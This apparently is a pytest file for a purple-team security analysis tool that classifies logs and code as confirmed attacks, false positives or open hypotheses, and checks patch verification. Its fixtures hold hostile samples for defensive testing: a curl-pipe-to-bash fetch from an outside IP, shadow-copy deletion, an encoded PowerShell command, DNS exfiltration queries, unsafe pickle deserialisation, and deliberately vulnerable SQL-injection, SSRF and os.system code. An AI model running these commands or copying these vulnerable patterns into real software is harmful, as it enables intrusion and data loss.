"""Tests for claim-level observed-vs-hypothesized grounding, 3-stage lifecycle, LLM overrides, and generalization."""

from __future__ import annotations

import json
from fastapi.testclient import TestClient

from hermes_cyber.blue_agent import BlueInvestigatorAgent
from hermes_cyber.models import (
    AnalyticalClaim,
    ContradictionItem,
    RedOperationPlan,
    SigmaRuleSpec,
    VerdictType,
    YaraRuleSpec,
)
from hermes_cyber.observer import CyberObserver
from hermes_cyber.pipeline import CyberPurpleAssistant
from hermes_cyber.red_agent import RedOperatorAgent
from hermes_cyber.router_bridge import ModelRouter
from hermes_cyber.scenarios import SCENARIO_MAP
from hermes_cyber.server.standalone import app
from hermes_cyber.server.state import reset_cyber_assistants
from hermes_cyber.verifier import PurpleVerifier, classify_supported_verdict


def test_explicit_observed_vs_hypothesized_claims_and_single_indicator_abstention(tmp_path):
    assistant = CyberPurpleAssistant(home_dir=tmp_path, allow_remote=False, use_llm=False)

    # 1) Isolated DNS TXT query must remain an open hypothesis with explicit missing proof
    dns_report = assistant.analyze_custom(
        title="Single DNS TXT Event",
        content='2026-11-17T10:00:00Z host=app-node-12 proc=worker qtype=TXT query="lookup.service.example.net"',
        source_kind="log",
    )
    assert dns_report.verdict.verdict == VerdictType.INSUFFICIENT_EVIDENCE
    assert dns_report.verdict.diagnosis.status == "OPEN_HYPOTHESIS"
    assert dns_report.verdict.simulation.status == "COVERAGE_COMPLETE"
    assert dns_report.verdict.remediation_verification.status == "UNVERIFIED"
    assert len(dns_report.red_report.claims) == 1

    clm = dns_report.red_report.claims[0]
    assert clm.status == "open"
    assert clm.evidence_ids == ["EV-0001"]
    assert "qtype=TXT" in clm.observed_fact
    assert "exfiltration" in clm.proposed_interpretation.lower()
    assert len(clm.missing_conditions) >= 2
    assert "correlate" in clm.confirming_or_refuting_proof.lower()

    # 2) Isolated code sink snippet cannot falsely claim CONFIRMED_ATTACK without caller reachability
    sink_report = assistant.analyze_custom(
        title="Isolated Subprocess Sink",
        content="application started\nsubprocess.run(user_input, shell=True)",
        source_kind="code",
    )
    assert sink_report.verdict.verdict == VerdictType.INSUFFICIENT_EVIDENCE
    assert sink_report.verdict.diagnosis.status == "OPEN_HYPOTHESIS"
    assert sink_report.verdict.simulation.status == "COVERAGE_COMPLETE"
    assert sink_report.red_report.claims[0].status == "open"
    assert len(sink_report.red_report.claims[0].missing_conditions) >= 1


def test_generalization_entity_renaming_invariance(tmp_path):
    assistant = CyberPurpleAssistant(home_dir=tmp_path, allow_remote=False, use_llm=False)

    # Rename host, user, binary, and IP from Scenario 01 (restic -> borgbackup)
    renamed_backup = "\n".join([
        '2026-11-17T03:01:03Z host=db-vault-09 actor=svc_archive proc=vssadmin.exe cmd="vssadmin list shadows" alert="EDR-HIGH: shadow copy enum"',
        '2026-11-17T03:01:08Z host=db-vault-09 actor=svc_archive proc=borgbackup cmd="borgbackup create /var/ledger" writes_enc_ext=1420',
        '2026-11-17T03:01:12Z host=db-vault-09 net_dst=10.55.9.8 port=8443 proto=TLS bytes_out=482190112',
        '2026-11-17T03:01:13Z host=db-vault-09 auth=ChangeControl ticket=CHG-4412 window="03:00-04:00 UTC" approved_job="nightly_borg" status=ACTIVE',
        '2026-11-17T03:01:14Z host=db-vault-09 proc=borgbackup signer="CN=Borg Release Signing" signature_verified=true sha256_trusted=true',
        '2026-11-17T03:01:15Z host=db-vault-09 net_dst=10.55.9.8 zone=AUTHORIZED_BACKUP_VLAN ransomware_note=false vss_deleted=false',
        '[BASELINE] 2026-11-17T02:55:00Z host=db-vault-09 endpoint=/healthz status=200 benign=true',
    ])
    rep_b = assistant.analyze_custom(title="Renamed Signed Backup", content=renamed_backup, source_kind="log")
    assert rep_b.verdict.verdict == VerdictType.FALSE_POSITIVE_BENIGN
    assert rep_b.verdict.diagnosis.status == "REFUTED_FALSE_POSITIVE"
    assert "db-vault-09" in rep_b.verdict.winning_hypothesis
    assert "borgbackup" in rep_b.verdict.winning_hypothesis

    # Rename poller agent, account, and internal IP from Scenario 04 (prometheus-poller -> Datadog-Agent/7.1)
    renamed_poller = "\n".join([
        '2026-11-17T08:00:00Z auth_event=PasswordPolicyChange user=svc_telemetry changed_by=adm_ops ticket=SEC-880 "Secret rotated at 08:00:00Z"',
        '2026-11-17T08:00:05Z src=10.88.3.40 endpoint=/api/v2/ingest auth=FAILED user=svc_telemetry agent="Datadog-Agent/7.1" interval=5.0s attempt=1',
        '2026-11-17T08:00:10Z src=10.88.3.40 endpoint=/api/v2/ingest auth=FAILED user=svc_telemetry agent="Datadog-Agent/7.1" total_attempts=240 alert="SOC-MED: BruteForce detected"',
        '2026-11-17T08:00:12Z cmdb_host=10.88.3.40 role="internal-scraper" password_spray_targets=1 unique_usernames=1 success_after_fail=false',
        '2026-11-17T08:00:15Z auth_audit user=svc_telemetry lock_reason="stale secret in k8s cronjob datadog-agent" external_ingress=false',
        '[BASELINE] 2026-11-17T07:59:55Z src=10.88.3.40 endpoint=/api/v2/ingest auth=SUCCESS user=svc_telemetry agent="Datadog-Agent/7.1" benign=true',
    ])
    rep_p = assistant.analyze_custom(title="Renamed Poller Cron", content=renamed_poller, source_kind="log")
    assert rep_p.verdict.verdict == VerdictType.FALSE_POSITIVE_BENIGN
    assert "Datadog-Agent/7.1" in rep_p.verdict.winning_hypothesis
    assert "svc_telemetry" in rep_p.verdict.winning_hypothesis
    assert rep_p.verdict.replay.false_positive_rate == 0.0


def test_generalization_unrelated_benign_noise_and_missing_step_proof(tmp_path):
    assistant = CyberPurpleAssistant(home_dir=tmp_path, allow_remote=False, use_llm=False)

    # 1) Adding unrelated benign noise must not alter confirmed attack detection
    base_dns = SCENARIO_MAP["scen-02-ddos-masking-dns-exfil"].artifact_text
    noisy_dns = "\n".join([
        '[BASELINE] 2026-11-16T11:08:00Z host=cdn-edge-09 user=healthcheck_bot endpoint=/health status=200 benign=true',
        base_dns,
        '[BASELINE] 2026-11-16T11:12:00Z host=auth-02 proc=systemd cmd="systemctl status sshd" benign=true',
    ])
    noisy_rep = assistant.analyze_custom(title="Noisy DNS Exfil", content=noisy_dns, source_kind="log")
    assert noisy_rep.verdict.verdict == VerdictType.CONFIRMED_ATTACK
    assert noisy_rep.verdict.replay.false_positive_rate == 0.0

    # 2) Removing the proof of intermediate steps turns a confirmed chain into an open hypothesis
    partial_dns = '2026-11-16T11:10:12Z dns_src=10.10.4.22 qtype=TXT query="lookup.example.net"'
    partial_rep = assistant.analyze_custom(title="Partial DNS Without Proof", content=partial_dns, source_kind="log")
    assert partial_rep.verdict.verdict == VerdictType.INSUFFICIENT_EVIDENCE
    assert partial_rep.red_report.claims[0].status == "open"
    assert len(partial_rep.red_report.claims[0].missing_conditions) >= 2

    # 3) Removing SSRF lines from Scenario 03 must avoid fabricating an EXPLOITABLE_CHAIN SSRF report
    without_ssrf = "\n".join([
        'query = f"SELECT id FROM reports WHERE tenant_id = \'{tenant_id}\'"',
        'privileged: true',
    ])
    partial_code = assistant.analyze_custom(title="SQL Only No SSRF", content=without_ssrf, source_kind="code")
    assert partial_code.verdict.verdict == VerdictType.INSUFFICIENT_EVIDENCE
    assert "169.254.169.254" not in partial_code.red_report.primary_hypothesis


def test_generalization_mixed_legitimate_and_malicious_hosts_and_cross_host_contradiction_rejection(tmp_path):
    assistant = CyberPurpleAssistant(home_dir=tmp_path, allow_remote=False, use_llm=False)

    # 1) Mixed artifact: legitimate signed backup on srv-backup-01 AND active RCE on web-prod-04
    mixed_log = "\n".join([
        '2026-11-17T02:01:08Z host=srv-backup-01 actor=svc_backup proc=borgbackup cmd="borgbackup create /ledger" writes_enc_ext=1400',
        '2026-11-17T02:01:13Z host=srv-backup-01 auth=ChangeControl ticket=CHG-111 status=ACTIVE',
        '2026-11-17T02:01:14Z host=srv-backup-01 proc=borgbackup signer="CN=Trusted Key" signature_verified=true sha256_trusted=true',
        '2026-11-17T02:01:15Z host=srv-backup-01 net_dst=10.20.1.5 zone=AUTHORIZED_BACKUP_VLAN ransomware_note=false vss_deleted=false',
        '2026-11-17T02:02:01Z host=web-prod-04 src=198.51.100.99 method=POST /api/v2/session/restore waf_status=ALLOWED',
        'def restore_blob(b): return pickle.loads(base64.b64decode(b))',
        '2026-11-17T02:02:03Z host=web-prod-04 parent_proc=python3 proc=sh cmd="sh -c curl http://198.51.100.99/p.sh | bash"',
        '[BASELINE] 2026-11-17T02:00:00Z host=srv-backup-01 endpoint=/healthz status=200 benign=true',
    ])
    mixed_rep = assistant.analyze_custom(title="Mixed Hosts Log", content=mixed_log, source_kind="http")
    assert mixed_rep.verdict.verdict == VerdictType.CONFIRMED_ATTACK
    assert mixed_rep.verdict.diagnosis.status == "CONFIRMED_THREAT"
    assert len(mixed_rep.verdict.diagnosis.refuted_claim_ids) >= 1
    assert len(mixed_rep.verdict.diagnosis.supported_claim_ids) >= 1
    assert mixed_rep.verdict.replay.detection_coverage == 1.0

    # 2) PurpleVerifier must reject a cross-host contradiction where monitor-01 evidence tries to refute web-prod-04 claim
    observer = CyberObserver()
    ing = observer.ingest_text(
        '2026-11-17T12:00:00Z host=web-prod-04 parent_proc=python3 proc=sh cmd="sh -c curl http://198.51.100.99/s.sh"\n'
        '2026-11-17T12:00:05Z host=monitor-01 actor=svc_health signature_verified=true status=200\n',
        title="Cross-Host Contradiction Check",
        source_kind="log",
    )
    red_plan = RedOperationPlan(
        primary_hypothesis="Remote shell execution on web-prod-04",
        confidence=0.88,
        claims=[
            AnalyticalClaim(
                claim_id="CLM-01",
                step_index=0,
                tactic="Execution",
                technique_id="T1059.004",
                observed_fact="[EV-0001] web-prod-04 spawned sh -c curl",
                evidence_ids=["EV-0001"],
                subject_entities={"hosts": ["web-prod-04"], "processes": ["sh"]},
                proposed_interpretation="Unauthorized reverse stager execution on web-prod-04",
                missing_conditions=[],
                confirming_or_refuting_proof="Audit web-prod-04 egress logs.",
                status="supported",
            )
        ],
        cited_evidence_ids=["EV-0001"],
    )
    blue_bad = BlueInvestigatorAgent().analyze(ing, red_plan)[0].model_copy(update={
        "contradictions": [
            ContradictionItem(
                claim_challenged="Remote shell execution on web-prod-04",
                target_claim_id="CLM-01",
                target_evidence_ids=["EV-0001"],
                contradicting_evidence_ids=["EV-0002"],
                explanation="EV-0002 documents healthy service on host=monitor-01.",
                impact_on_hypothesis="refutes",
            )
        ]
    })
    clean_red, clean_blue, verdict = PurpleVerifier().verify(ing, red_plan, blue_bad)
    assert clean_blue.contradictions[0].entity_coherent is False
    assert len(verdict.incoherent_contradictions_rejected) == 1
    assert clean_red.claims[0].status == "supported"
    assert verdict.verdict == VerdictType.CONFIRMED_ATTACK

    # 3) Distinct hosts that SHARE the same service user account must STILL reject cross-host refutation
    ing_shared = observer.ingest_text(
        '2026-11-17T12:10:00Z host=web-prod-04 user=svc_shared proc=vssadmin.exe cmd="vssadmin delete shadows /all /quiet" signature_verified=false\n'
        '2026-11-17T12:10:05Z host=srv-backup-01 user=svc_shared proc=borgbackup signature_verified=true auth=ChangeControl zone=AUTHORIZED_BACKUP_VLAN\n',
        title="Shared User Cross-Host Check",
        source_kind="log",
    )
    red_shared = RedOperationPlan(
        primary_hypothesis="Shadow wipe on web-prod-04",
        confidence=0.88,
        claims=[
            AnalyticalClaim(
                claim_id="CLM-01",
                step_index=0,
                tactic="Impact",
                technique_id="T1490",
                observed_fact="[EV-0001] web-prod-04 unsigned vssadmin delete shadows by svc_shared",
                evidence_ids=["EV-0001"],
                subject_entities={"hosts": ["web-prod-04"], "users": ["svc_shared"]},
                proposed_interpretation="Unauthorized ransomware shadow wipe on web-prod-04",
                missing_conditions=[],
                confirming_or_refuting_proof="Verify binary signature on web-prod-04.",
                status="supported",
            )
        ],
        cited_evidence_ids=["EV-0001"],
    )
    blue_shared = BlueInvestigatorAgent().analyze(ing_shared, red_shared)[0].model_copy(update={
        "contradictions": [
            ContradictionItem(
                claim_challenged="Shadow wipe on web-prod-04",
                target_claim_id="CLM-01",
                target_evidence_ids=["EV-0001"],
                contradicting_evidence_ids=["EV-0002"],
                explanation="Signed backup for svc_shared observed on srv-backup-01.",
                impact_on_hypothesis="refutes",
            )
        ]
    })
    clean_red_s, clean_blue_s, verdict_s = PurpleVerifier().verify(ing_shared, red_shared, blue_shared)
    assert clean_blue_s.contradictions[0].entity_coherent is False
    assert len(verdict_s.incoherent_contradictions_rejected) == 1
    assert clean_red_s.claims[0].status == "supported"
    assert verdict_s.verdict == VerdictType.CONFIRMED_ATTACK


def test_separation_of_diagnosis_simulation_and_remediation_verification_loop(tmp_path, monkeypatch):
    monkeypatch.setenv("HERMES_HOME", str(tmp_path / ".hermes"))
    (tmp_path / ".hermes").mkdir(parents=True, exist_ok=True)
    reset_cyber_assistants()
    assistant = CyberPurpleAssistant(home_dir=tmp_path, allow_remote=False, use_llm=False)

    # Phase A: Close an open investigation by appending missing corroborating evidence
    open_rep = assistant.analyze_custom(
        title="Progressive DNS Case",
        content='2026-11-16T11:10:01Z host=db-core-02 proc=python3 qtype=TXT query="init.example.net"',
        source_kind="log",
    )
    assert open_rep.verdict.diagnosis.status == "OPEN_HYPOTHESIS"
    assert open_rep.verdict.simulation.status == "COVERAGE_COMPLETE"
    assert open_rep.verdict.remediation_verification.status == "UNVERIFIED"

    closed_rep = assistant.verify_case_update(
        case_id=open_rep.case_id,
        mode="append_evidence",
        content=(
            '2026-11-16T11:10:05Z host=db-core-02 ip=10.10.4.22 event=token_leak user=svc_etl\n'
            '2026-11-16T11:10:09Z host=db-core-02 proc=powershell.exe cmd="powershell -enc SQBFAFgA" child_of=mysqld\n'
            '2026-11-16T11:10:12Z dns_src=10.10.4.22 qtype=TXT query="MZXW6.exfil.c2-sync.example.net" entropy=4.9 dns_txt_authorized=false'
        ),
    )
    assert closed_rep.verdict.remediation_verification.status == "EVIDENCE_UPDATED"
    assert closed_rep.verdict.remediation_verification.before_verdict == VerdictType.INSUFFICIENT_EVIDENCE
    assert closed_rep.verdict.remediation_verification.after_verdict == VerdictType.CONFIRMED_ATTACK
    assert len(closed_rep.verdict.remediation_verification.added_evidence_ids) == 3

    # Phase B: Verify partial vs full fix on vulnerable scenario via FastAPI /verify endpoint
    client = TestClient(app)
    vuln = client.post(
        "/api/plugins/cyber-purple-suite/analyze/scenario",
        json={"scenario_id": "scen-03-sqli-ssrf-code-chain"},
    )
    assert vuln.status_code == 200
    cid = vuln.json()["case_id"]
    assert vuln.json()["verdict"]["verdict"] == "EXPLOITABLE_CHAIN"

    # Partial patch: privileged dropped, but SQL concatenation & unvalidated SSRF remain
    partial_patch = (
        '@app.get("/api/v1/export")\n'
        'def export_customer_report(tenant_id: str, webhook_url: str):\n'
        '    query = f"SELECT id FROM reports WHERE tenant_id = \'{tenant_id}\'"\n'
        '    meta = requests.get(webhook_url, timeout=3).text\n'
        'privileged: false'
    )
    res_part = client.post(
        "/api/plugins/cyber-purple-suite/verify",
        json={"case_id": cid, "content": partial_patch, "mode": "verify_patch"},
    )
    assert res_part.status_code == 200
    assert res_part.json()["verdict"]["remediation_verification"]["status"] == "PARTIALLY_MITIGATED"

    # Full patch: parameterized SQL + validate_https_public_allowlist + allow_redirects=False + privileged: false
    full_patch = (
        '@app.get("/api/v1/export")\n'
        'def export_customer_report(tenant_id: str, webhook_url: str):\n'
        '    rows = db.execute("SELECT id, webhook_url FROM reports WHERE tenant_id = ?", (tenant_id,)).fetchall()\n'
        '    validate_https_public_allowlist(webhook_url)\n'
        '    meta = requests.get(webhook_url, timeout=3, allow_redirects=False).text\n'
        '    return {"rows": len(rows), "preview": meta}\n'
        'privileged: false\nallowPrivilegeEscalation: false'
    )
    res_fixed = client.post(
        "/api/plugins/cyber-purple-suite/verify",
        json={"case_id": cid, "content": full_patch, "mode": "verify_patch"},
    )
    assert res_fixed.status_code == 200
    rem = res_fixed.json()["verdict"]["remediation_verification"]
    assert rem["status"] == "VERIFIED_FIXED"
    assert res_fixed.json()["verdict"]["diagnosis"]["status"] == "NO_THREAT_EVIDENCE"
    assert rem["after_verdict"] == "INSUFFICIENT_EVIDENCE"

    # Phase C: Unrelated or incomplete patch submissions must NOT declare VERIFIED_FIXED
    fresh_vuln = assistant.analyze_scenario("scen-03-sqli-ssrf-code-chain")
    assert len(fresh_vuln.red_report.claims) == 3

    unrelated_check = assistant.verify_case_update(
        case_id=fresh_vuln.case_id,
        mode="verify_patch",
        content="GET /health status=200",
    )
    assert unrelated_check.verdict.remediation_verification.status == "STILL_VULNERABLE"
    assert unrelated_check.verdict.remediation_verification.resolved_claim_ids == []
    assert len(unrelated_check.verdict.remediation_verification.remaining_open_claim_ids) == 3
    assert unrelated_check.verdict.verdict == VerdictType.EXPLOITABLE_CHAIN

    incomplete_patch = (
        '@app.get("/api/v1/export")\n'
        'def export_customer_report(tenant_id: str, webhook_url: str):\n'
        '    rows = db.execute("SELECT id, webhook_url FROM reports WHERE tenant_id = ?", (tenant_id,)).fetchall()\n'
        '    validate_https_public_allowlist(webhook_url)\n'
        '    meta = requests.get(webhook_url, timeout=3, allow_redirects=False).text\n'
    )
    incomplete_check = assistant.verify_case_update(
        case_id=fresh_vuln.case_id,
        mode="verify_patch",
        content=incomplete_patch,
    )
    assert incomplete_check.verdict.remediation_verification.status == "PARTIALLY_MITIGATED"
    assert "CLM-03" in incomplete_check.verdict.remediation_verification.remaining_open_claim_ids
    assert incomplete_check.verdict.verdict != VerdictType.FALSE_POSITIVE_BENIGN

    # Phase D: Semantic claim identity survives ordinal CLM-xx shifts when append_evidence adds earlier tracks
    shift_open = assistant.analyze_custom(
        title="Claim Shift Check",
        content='2026-11-17T10:00:00Z host=app-shift-01 proc=worker qtype=TXT query="ping.example.net"',
        source_kind="log",
    )
    assert shift_open.red_report.claims[0].claim_id == "CLM-01"
    assert shift_open.red_report.claims[0].status == "open"
    shifted = assistant.verify_case_update(
        case_id=shift_open.case_id,
        mode="append_evidence",
        content=(
            '@app.get("/api/v1/export")\n'
            'def export_shift(t, url): return requests.get(url).text + f"SELECT * FROM t WHERE id={t}"'
        ),
    )
    # Track 1 shifts the original Exfiltration/DNS TXT claim from CLM-01 -> CLM-03; it is still open!
    assert shifted.verdict.remediation_verification.resolved_claim_ids == []
    assert any(
        c.tactic == "Exfiltration" and c.claim_id != "CLM-01" and c.claim_id in shifted.verdict.remediation_verification.remaining_open_claim_ids
        for c in shifted.red_report.claims
    )

    reset_cyber_assistants()


def test_llm_full_analysis_override_updates_claims_chain_and_simulations():
    observer = CyberObserver()
    ing = observer.ingest_text(
        '2026-11-17T15:00:00Z host=app-01 proc=python3 qtype=TXT query="data.c2-sync.example.net"\n'
        '2026-11-17T15:00:02Z host=app-01 proc=python3 event=token_leak\n',
        title="LLM Override Check",
        source_kind="log",
    )

    class RevisingRouter(ModelRouter):
        def is_active_endpoint_local(self) -> bool:
            return True

        def generate(self, prompt: str, system_prompt: str = "", **kwargs) -> str:
            if "RED OPERATOR" in system_prompt:
                return json.dumps({
                    "primary_hypothesis": "Revised LLM Hypothesis: C2 Beacon with unverified process origin.",
                    "confidence": 0.42,
                    "kill_chain": [
                        {
                            "tactic": "Command and Control",
                            "technique_id": "T1071.004",
                            "technique_name": "DNS Application Layer Protocol",
                            "observed_fact": "[EV-0001] qtype=TXT query recorded on app-01.",
                            "proposed_interpretation": "Revised LLM DNS C2 beacon hypothesis.",
                            "missing_conditions": ["Memory dump of app-01 python3 process"],
                            "confirming_or_refuting_proof": "Capture pcap + memory strings from app-01.",
                            "evidence_ids": ["EV-0001"],
                        }
                    ],
                    "simulated_events": [
                        {
                            "variant": "baseline_attack",
                            "log_line": 'host=app-01 qtype=TXT query="llm-beacon.c2-sync.example.net"',
                            "mitre_technique_id": "T1071.004",
                        }
                    ],
                    "cited_evidence_ids": ["EV-0001"],
                })
            return json.dumps({
                "competing_hypothesis": "Revised Blue Hypothesis: Needs process memory verification.",
                "confidence": 0.58,
                "replace_contradictions": True,
                "contradictions": [
                    {
                        "claim_challenged": "Revised LLM DNS C2 beacon hypothesis.",
                        "target_claim_id": "CLM-01",
                        "contradicting_evidence_ids": ["EV-0001"],
                        "explanation": "Single DNS beacon line requires app-01 memory verification.",
                        "impact_on_hypothesis": "weakens",
                    }
                ],
                "detection_keywords": ["llm-beacon"],
                "remediation_patch": "# Revised LLM patch",
                "cited_evidence_ids": ["EV-0001"],
            })

    red_plan, _, _ = RedOperatorAgent().analyze(ing, router=RevisingRouter(allow_remote=False))
    blue_rep, _, _ = BlueInvestigatorAgent().analyze(ing, red_plan, router=RevisingRouter(allow_remote=False))
    clean_red, clean_blue, verdict = PurpleVerifier().verify(ing, red_plan, blue_rep)

    assert clean_red.kill_chain[0].technique_id == "T1071.004"
    assert clean_red.claims[0].status == "open"
    assert clean_red.claims[0].missing_conditions == ["Memory dump of app-01 python3 process"]
    assert clean_red.simulated_events[0].log_line == 'host=app-01 qtype=TXT query="llm-beacon.c2-sync.example.net"'
    assert clean_red.confidence == 0.42
    assert len(clean_blue.contradictions) == 1
    assert clean_blue.contradictions[0].target_claim_id == "CLM-01"
    assert clean_blue.sigma_rule.detection_keywords == ["llm-beacon"]
    assert verdict.diagnosis.status == "OPEN_HYPOTHESIS"
    assert verdict.simulation.status == "COVERAGE_COMPLETE"


def test_patch_verification_multi_route_surface_isolation_and_new_threat_preservation(tmp_path):
    assistant = CyberPurpleAssistant(home_dir=tmp_path, allow_remote=False, use_llm=False)

    # 1) Multi-route code artifact: partial-overlap patch keeping Route A unfixed while omitting Route B
    #    must preserve Route B (/api/v1/admin) in saved claims, and fixing Route A alone must NEVER return VERIFIED_FIXED.
    two_routes = (
        '@app.get("/api/v1/export")\n'
        'def export_data(tid: str): query = f"SELECT * FROM t WHERE id={tid}"\n'
        '@app.get("/api/v1/admin")\n'
        'def admin_search(q: str): query = f"SELECT * FROM audit WHERE q={q}"\n'
    )
    orig = assistant.analyze_custom(title="Two Vulnerable Routes", content=two_routes, source_kind="code")
    route_a_still_vuln_route_b_omitted = (
        '@app.get("/api/v1/export")\n'
        'def export_data(tid: str): query = f"SELECT * FROM t WHERE id={tid}"\n'
    )
    res_partial_overlap = assistant.verify_case_update(
        case_id=orig.case_id,
        mode="verify_patch",
        content=route_a_still_vuln_route_b_omitted,
    )
    assert res_partial_overlap.verdict.remediation_verification.status == "STILL_VULNERABLE"
    assert any(
        "/api/v1/admin" in c.subject_entities.get("endpoints", []) or "EV-0004" in c.evidence_ids
        for c in res_partial_overlap.red_report.claims
    )

    only_route_a_fixed = (
        '@app.get("/api/v1/export")\n'
        'def export_data(tid: str): return db.execute("SELECT * FROM t WHERE id = ?", (tid,)).fetchall()\n'
    )
    res_omitted = assistant.verify_case_update(
        case_id=orig.case_id,
        mode="verify_patch",
        content=only_route_a_fixed,
    )
    assert res_omitted.verdict.remediation_verification.status != "VERIFIED_FIXED"
    assert len(res_omitted.verdict.remediation_verification.remaining_open_claim_ids) >= 1

    # 2) Patch resolves /api/v1/export, omits container manifest (CLM-03), and adds a new active threat (/api/v1/debug)
    vuln_chain = assistant.analyze_scenario("scen-03-sqli-ssrf-code-chain")
    mixed_patch = (
        '@app.get("/api/v1/export")\n'
        'def export_customer_report(tenant_id: str, webhook_url: str):\n'
        '    rows = db.execute("SELECT id, webhook_url FROM reports WHERE tenant_id = ?", (tenant_id,)).fetchall()\n'
        '    validate_https_public_allowlist(webhook_url)\n'
        '    return requests.get(webhook_url, timeout=3, allow_redirects=False).text\n'
        '@app.get("/api/v1/debug")\n'
        'def debug_exec(cmd: str):\n'
        '    return os.system(cmd)\n'
    )
    res_mixed = assistant.verify_case_update(
        case_id=vuln_chain.case_id,
        mode="verify_patch",
        content=mixed_patch,
    )
    rem = res_mixed.verdict.remediation_verification
    assert rem.status == "PARTIALLY_MITIGATED"
    assert any(c.technique_id == "T1611" for c in res_mixed.red_report.claims)
    assert any("os.system" in c.observed_fact or "/api/v1/debug" in str(c.subject_entities) for c in res_mixed.red_report.claims)
    assert len(rem.remaining_open_claim_ids) >= 2

    saved_by_id = {ev.evidence_id: ev for ev in res_mixed.ingestion.evidences}
    claim_ids = {c.claim_id for c in res_mixed.red_report.claims}
    assert len(rem.added_evidence_ids) == 8
    assert all(eid in saved_by_id for eid in rem.added_evidence_ids)
    assert any("/api/v1/debug" in saved_by_id[eid].raw_content for eid in rem.added_evidence_ids)

    # All Blue/Red/Verdict references must point to the remapped patch EV-xxxx records and live claim IDs
    debug_eid = next(ev.evidence_id for ev in res_mixed.ingestion.evidences if "os.system" in ev.raw_content)
    assert debug_eid in rem.added_evidence_ids
    assert debug_eid in res_mixed.blue_report.cited_evidence_ids
    assert debug_eid in res_mixed.verdict.verified_citations
    assert any(debug_eid in step.evidence_ids for step in res_mixed.red_report.kill_chain)
    for contra in res_mixed.blue_report.contradictions:
        assert all(eid in saved_by_id for eid in contra.contradicting_evidence_ids)
        if contra.target_claim_id:
            assert contra.target_claim_id in claim_ids
    for sim in res_mixed.red_report.simulated_events:
        if sim.claim_id:
            assert sim.claim_id in claim_ids

    # 3) Shared verifier threshold must NOT inflate 2 supported claims citing only 1 single evidence record to EXPLOITABLE_CHAIN
    assert classify_supported_verdict("code", 2, 1) == VerdictType.CONFIRMED_ATTACK
    assert classify_supported_verdict("code", 2, 2) == VerdictType.EXPLOITABLE_CHAIN

    one_line_chain = assistant.analyze_custom(
        title="Single Line Multi-Sink",
        content='def one(x, u): return requests.get(u).text + f"SELECT * FROM t WHERE id={x}"',
        source_kind="code",
    )
    # Patch keeping both sinks on a single line (1 EV record) + verifying Verifier verdict threshold
    assert one_line_chain.verdict.verdict == VerdictType.CONFIRMED_ATTACK


